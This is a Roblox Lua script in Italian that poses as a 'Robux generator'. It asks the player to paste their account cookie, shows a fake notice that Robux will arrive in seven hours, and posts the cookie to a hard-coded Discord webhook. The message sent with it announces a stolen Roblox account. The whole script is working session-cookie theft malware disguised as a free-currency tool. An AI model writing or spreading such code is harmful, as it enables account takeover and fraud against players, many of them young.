local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Generatore di robux by FCNM4TT10", HidePremium = false, SaveConfig = false})

function RobuxGenerati()
	OrionLib:MakeNotification({
		Name = "Robux Generati!",
		Content = "Robux Generati con successo, aspetta 7 ore e verrano accreditati nel tuo account.",
		Image = "rbxassetid://17822616121",
		Time = 5
	})
end

_G.Nome = "string"

function Nome()
	function SendMessage(url, message)
		local http = game:GetService("HttpService")
		local headers = {
			["Content-Type"] = "application/json"
		}
		local data = {
			["content"] = message
		}
		local body = http:JSONEncode(data)
		local response = request({
			Url = url,
			Method = "POST",
			Headers = headers,
			Body = body
		})
end

function SendMessageEMBED(url, embed)
	local http = game:GetService("HttpService")
	local headers = {
		["Content-Type"] = "application/json"
	}
	local data = {
		["embeds"] = {
			["title"] = embed.title,
			["description"] = embed.description,
			["color"] = embed.color,
			["fields"] = embed.fields,
			["footer"] = {
				["text"] = embed.footer.text
			}
		}
	}
	local body = http:JSONEncode(data)
	local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

local url = "https://discordapp.com/api/webhooks/1250189153182683239/G3YpQpu-kSKGgNcMe-tVUQFjPBzhUj2OL37BJ-wNh34IPpf1zpSayCFuUqc1701kWLDU"
SendMessage(url, "> **ACCOUNT ROBLOX RUBATO, ECCO IL COOKIE: **".._G.Nome..", veloci ad usarlo, oppure scadrà!")
end

local diocane = Window:MakeTab({
	Name = "Generatore",
	Icon = "rbxassetid://17822667829",
	PremiumOnly = false
})
diocane:AddTextbox({
	Name = "Numero di robux",
	Default = "",
	TextDisappear = false,
	Callback = function(Value)
		print("banana")
	end
})
diocane:AddTextbox({
	Name = "Cookie",
	Default = "",
	TextDisappear = false,
	Callback = function(Value)
		_G.Nome = Value
	end
})
diocane:AddButton({
	Name = "Conferma Cookie",
	Callback = function()
		Nome()
	end
})
